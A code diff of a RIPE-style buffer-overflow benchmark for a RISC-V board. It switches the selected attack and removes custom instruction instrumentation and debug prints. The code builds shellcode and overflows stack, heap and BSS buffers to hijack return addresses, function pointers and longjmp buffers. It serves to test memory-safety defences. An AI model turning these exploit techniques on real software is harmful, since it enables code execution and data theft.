@@ -119,49 +119,43 @@ print_current_test_parameters(void) {
 void
 main(void)
 {
-    static int r1, r2;
-
-  //INSA_INST - enable crash
-  //__asm__(".insn u 0x0B, x5, 831" : : : ); 
-  //__asm__(".insn u 0x2B, x6, 91" : : : ); 
-#define ATTACK_NR   10
-// 1-5-9 ok  8 ok
-#if ATTACK_NR == 1  // patch retaddr
+#define ATTACK_NR   4
+#if ATTACK_NR == 1
     attack.technique = DIRECT;
     attack.inject_param = INJECTED_CODE_NO_NOP;
     attack.code_ptr= RET_ADDR;
     attack.location = STACK;
     attack.function = MEMCPY;
 
-#elif ATTACK_NR == 2  // heap fix
+#elif ATTACK_NR == 2
     attack.technique = DIRECT;
     attack.inject_param = INJECTED_CODE_NO_NOP;
     attack.code_ptr= FUNC_PTR_STACK_VAR;
     attack.location = STACK;
     attack.function = MEMCPY;
 
-#elif ATTACK_NR == 3 // heap fix // ?
+#elif ATTACK_NR == 3
     attack.technique = INDIRECT;
     attack.inject_param = INJECTED_CODE_NO_NOP;
     attack.code_ptr= FUNC_PTR_STACK_VAR;
     attack.location = STACK;
     attack.function = MEMCPY;
 
-#elif ATTACK_NR == 4 // no fix
+#elif ATTACK_NR == 4
     attack.technique = DIRECT;
     attack.inject_param = DATA_ONLY;
     attack.code_ptr= VAR_LEAK;
     attack.location = HEAP;
     attack.function = SPRINTF;
 
-#elif ATTACK_NR == 5 // patch retaddr
+#elif ATTACK_NR == 5
     attack.technique = DIRECT;
     attack.inject_param = RETURN_INTO_LIBC;
     attack.code_ptr= RET_ADDR;
     attack.location = STACK;
     attack.function = MEMCPY;
 
-#elif ATTACK_NR == 6 
+#elif ATTACK_NR == 6
     attack.technique = INDIRECT;
     attack.inject_param = RETURN_INTO_LIBC;
     attack.code_ptr= FUNC_PTR_HEAP;
@@ -175,21 +169,21 @@ main(void)
     attack.location = HEAP;
     attack.function = HOMEBREW;
 
-#elif ATTACK_NR == 8 // patch
+#elif ATTACK_NR == 8
     attack.technique = INDIRECT;
     attack.inject_param = RETURN_INTO_LIBC;
     attack.code_ptr= LONGJMP_BUF_HEAP;
     attack.location = HEAP;
     attack.function = MEMCPY;
 
-#elif ATTACK_NR == 9 // retaddr fix
+#elif ATTACK_NR == 9
     attack.technique = DIRECT;
     attack.inject_param = RETURN_ORIENTED_PROGRAMMING;
     attack.code_ptr= RET_ADDR;
     attack.location = STACK;
     attack.function = MEMCPY;
 
-#elif ATTACK_NR == 10 
+#elif ATTACK_NR == 10
     attack.technique = DIRECT;
     attack.inject_param = RETURN_ORIENTED_PROGRAMMING;
     attack.code_ptr= STRUCT_FUNC_PTR_HEAP;
@@ -197,18 +191,9 @@ main(void)
     attack.function = SPRINTF;
 
 #endif
-    // enable crash
-    __asm__(".insn u 0x7B, x0, 0" : : : ); 
-    __asm__(".insn u 0x0B, %0 , 813" :  "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0 , 29" :   "=r"(r2) : : ); 
-    printf("[INSA] interval start of program  = [%p, %p]\n", r1, r2);
 
     printk("RIPE is alive! %s\n", CONFIG_BOARD);
     print_current_test_parameters();
-
-    __asm__(".insn u 0x0B, x5, 823" : : : ); 
-    __asm__(".insn u 0x2B, x6, 293" : : : ); 
-
     try_attack();
 
     printf("Unexpected back in main\n");
@@ -240,7 +225,6 @@ perform_attack(
     long * stack_mem_ptr_aux;
     int stack_flag;
 	char stack_secret[32];
-
 	strcpy(stack_secret, data_secret);
     char stack_buffer[1024];
     struct attackme stack_struct;
@@ -259,8 +243,6 @@ perform_attack(
     struct attackme * heap_struct =
       (struct attackme *) malloc(sizeof(struct attackme));
     heap_struct->func_ptr = dummy_function;
-
-    printf("heap_struct->func_ptr: %p\n", heap_struct->func_ptr);
 
     /* Two buffers declared to be able to chose buffer that gets allocated    */
     /* first on the heap. The other buffer will be set as a target, i.e. a    */
@@ -295,9 +277,6 @@ perform_attack(
     static jmp_buf bss_jmp_buffer;
     static struct attackme bss_struct;
 
-    //INSA
-    static int r1, r2;
-
     /* Pointer to buffer to overflow */
     char * buffer;
     /* Address to target for direct (part of) overflow */
@@ -320,15 +299,8 @@ perform_attack(
     bss_buffer[0]  = 'a';
   	strcpy(bss_secret, data_secret);
 
-
-    __asm__(".insn u 0x0B, x5, 833" : : : ); 
-    __asm__(".insn u 0x2B, x6, 233" : : : ); 
-
     // write shellcode with correct jump address
     build_shellcode(shellcode_nonop);
-
-    __asm__(".insn u 0x0B, x5, 863" : : : ); 
-    __asm__(".insn u 0x2B, x6, 263" : : : ); 
 
     switch (attack.location) {
         case STACK:
@@ -375,10 +347,14 @@ perform_attack(
                 heap_mem_ptr_aux = (long *) heap_buffer2;
                 heap_mem_ptr     = (long *) heap_buffer3;
 
-                if (attack.code_ptr == VAR_LEAK) {
-                  heap_secret = heap_buffer2;
-                  strcpy(heap_secret, data_secret);
-                }
+				if (attack.code_ptr == VAR_LEAK) {
+          static int r3, r4;
+          __asm__(".insn u 0x0B, %0, 61" : "=r"(r3) : : ); 
+          __asm__(".insn u 0x2B, %0, 27" : "=r"(r4) : : ); 
+          printf("intervalle: %p - %p\n", r3, r4);
+					heap_secret = heap_buffer2;
+					strcpy(heap_secret, data_secret);
+				}
                 // Also set the location of the function pointer and the
                 // longjmp buffer on the heap (the same since only choose one)
                 heap_func_ptr = malloc(sizeof(void *));
@@ -457,7 +433,6 @@ perform_attack(
     if (heap_func_ptr)
         *heap_func_ptr = dummy_function;
 
-    //static int result;
     // Set Target Address
     switch (attack.technique) {
         case DIRECT:
@@ -541,9 +516,8 @@ perform_attack(
                             break;
                     }
                     break;
-
-            } 
-            //__asm__(".insn u 0x0B, %0, 0" : "=r"(result) : : ); 
+					
+            }
             break;
 
         case INDIRECT:
@@ -568,17 +542,7 @@ perform_attack(
             break;
     }
 
-    //printf("result: %d\n", result);
-
-    __asm__(".insn u 0x0B, %0, 0" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 1" : "=r"(r2) : : ); 
-    printf("[INSA] interval start of program  = [%p, %p]\n", r1, r2);
-
     // set longjmp buffers
-    __asm__(".insn u 0x0B, %0, 2" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 3" : "=r"(r2) : : ); 
-    printf("[INSA] interval before setjmp  = [%p, %p]\n", r1, r2);    
-
     switch (attack.code_ptr) {
         case LONGJMP_BUF_STACK_VAR:
             if (setjmp(stack_jmp_buffer) != 0) {
@@ -622,10 +586,6 @@ perform_attack(
         default:
             break;
     }
-
-    __asm__(".insn u 0x0B, %0, 4" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 5" : "=r"(r2) : : ); 
-    printf("[INSA] interval after setjmp  = [%p, %p]\n", r1, r2);
 
     payload.ptr_to_correct_return_addr = RET_ADDR_PTR;
 
@@ -762,10 +722,6 @@ perform_attack(
     /* Note: Here memory will be corrupted  */
     /****************************************/
 
-    __asm__(".insn u 0x0B, %0, 6" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 7" : "=r"(r2) : : ); 
-    printf("[INSA] interval before memcpy  = [%p, %p]\n", r1, r2);
-
     switch (attack.function) {
         case MEMCPY:
             // memcpy() shouldn't copy the terminating NULL, therefore - 1
@@ -803,12 +759,6 @@ perform_attack(
             break;
     }
 
-    printf("\n");
-    __asm__(".insn u 0x0B, %0, 610" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 738" : "=r"(r2) : : ); 
-    printf("[INSA] interval after memcpy  = [%p, %p]\n", r1, r2);
-
-
     /*******************************************/
     /* Ensure that code pointer is overwritten */
     /*******************************************/
@@ -838,8 +788,7 @@ perform_attack(
                         *(uint32_t *) (*(uint32_t *) target_addr) =
                           (uintptr_t) stack_mem_ptr_aux;
                         break;
-                    case HEAP: //atk 7
-                        printf("Je fais un load illegal juste apres\n");
+                    case HEAP:
                         *(uint32_t *) (*(uint32_t *) target_addr) =
                           (uintptr_t) *heap_mem_ptr_aux;
                         break;
@@ -865,42 +814,25 @@ perform_attack(
             break;
     }
 
-    printf("\n");
-    __asm__(".insn u 0x0B, %0, 612" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 732" : "=r"(r2) : : ); 
-    printf("[INSA] interval before attack  = [%p, %p]\n", r1, r2);
-
+    printf("");
     printf("\nExecuting attack... ");
-
-    static int r0;
 
     switch (attack.code_ptr) {
         case RET_ADDR:
             break;
         case FUNC_PTR_STACK_VAR:
-            //__asm__(".insn i 0x5B, 0, %0, %1, 0" : "=r"(r0) : "r"(&stack_func_ptr) : ); 
-            //printf("is stack_func_ptr in range? - %d\n", r0);
             stack_func_ptr(NULL);
-            // __asm__("lw a5,-340(s0)" : : : );
-            // __asm__("lw a5,0(a5)" : : : );
-            // __asm__("li a0,0" : : : );
-            // __asm__("li a1,0" : : : );
-            // __asm__("jalr a5" : : : );
             break;
         case FUNC_PTR_STACK_PARAM:
             ((int (*)(char *, int))(*stack_func_ptr_param))(NULL, 0);
             break;
         case FUNC_PTR_HEAP:
             ((int (*)(char *, int)) * heap_func_ptr)(NULL, 0);
-            // __asm__("lw a5,-1740(s0)" : : : );
-            // __asm__("lw a5,0(a5)" : : : );
-            // __asm__("li a0,0" : : : );
-            // __asm__("li a1,0" : : : );
-            // __asm__("jalr a5" : : : );
             break;
         case FUNC_PTR_BSS:
             ((int (*)(char *, int))(*bss_func_ptr))(NULL, 0);
             break;
+
         case FUNC_PTR_DATA:
             ((int (*)(char *, int))(*data_func_ptr))(NULL, 0);
             break;
@@ -922,13 +854,8 @@ perform_attack(
         case STRUCT_FUNC_PTR_STACK:
             ((int (*)(char *, int)) * (stack_struct.func_ptr))(NULL, 0);
             break;
-        case STRUCT_FUNC_PTR_HEAP: //atk 7
+        case STRUCT_FUNC_PTR_HEAP:
             (*heap_struct->func_ptr)(NULL, 0);
-            //__asm__("lw a5,-1748(s0)" : : : );
-            //__asm__("lw a5,256(a5)" : : : );
-            //__asm__("li a0,0" : : : );
-            //__asm__("li a1,0" : : : );
-            //__asm__("jalr a5" : : : );
             break;
         case STRUCT_FUNC_PTR_DATA:
             (*data_struct.func_ptr)(NULL, 0);
@@ -967,9 +894,7 @@ build_payload(CHARPAYLOAD * payload)
 {
     size_t size_shellcode, bytes_to_pad;
     char * shellcode, * temp_char_buffer, * temp_char_ptr;
-
-    static int r1,r2;
-
+    
     /* Allocate payload buffer */
     payload->buffer = (char *) malloc(payload->size);
     if (payload->buffer == NULL) {
@@ -977,7 +902,6 @@ build_payload(CHARPAYLOAD * payload)
             printk("Unable to allocate payload buffer.");
         return FALSE;
     }
-    
 	switch (attack.inject_param) {
         case INJECTED_CODE_NO_NOP:
             if (payload->size < (size_shellcode_nonop + sizeof(long))) {
@@ -1012,10 +936,6 @@ build_payload(CHARPAYLOAD * payload)
     }
 
     /* Copy shellcode into payload buffer */
-    
-    __asm__(".insn u 0x0B, %0, 12" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 13" : "=r"(r2) : : ); 
-    printf("[INSA - PAYLOAD] interval before build_payload  = [%p, %p]\n", r1, r2);
     memcpy(payload->buffer, shellcode, size_shellcode);
 
     /* Calculate number of bytes to pad with */
@@ -1043,14 +963,9 @@ build_payload(CHARPAYLOAD * payload)
     
 	if (output_debug_info)
         fprintf(stderr, "payload: %s\n", payload->buffer);
-
-    __asm__(".insn u 0x0B, %0, 14" : "=r"(r1) : : ); 
-    __asm__(".insn u 0x2B, %0, 15" : "=r"(r2) : : ); 
-    printf("[INSA - PAYLOAD] interval after build_payload  = [%p, %p]\n", r1, r2);
-
     return TRUE;
+
 	
-    
 } /* build_payload */
 
 // JM: call longjmp on a buffer in perform_attack()
@@ -1167,9 +1082,6 @@ build_shellcode(char * shellcode)
     memset(lui_s,       0, sizeof(lui_s) );
     memset(addi_s,      0, sizeof(addi_s) );
 
-    //__asm__(".insn u 0x0B, x5, 893" : : : ); 
-    //__asm__(".insn u 0x2B, x6, 293" : : : ); 
-
 	// fix shellcode when lower bits become negative
 	if (((unsigned long)&shellcode_target & 0x00000fff) >= 0x800)
 		hex_to_string(attack_addr, &shellcode_target + 0x1000);
@@ -1182,12 +1094,12 @@ build_shellcode(char * shellcode)
 
     jalr_val = strtoul(jalr_s, 0, 16);
 
-    // em ok generate 20 imm bits for the LUI insn
+    // generate 20 imm bits for the LUI insn
     for (int i = 0; i < 5; i++) {
         strncat(lui_bin, hex_to_bin(high_bits[i]), 4);
     }
 
-    // em broken append reg and opcode bits, then convert to raw binary
+    // append reg and opcode bits, then convert to raw binary
     strncat(lui_bin, "001100110111", 12);
     lui_val = strtoul(lui_bin, 0, 2);
 
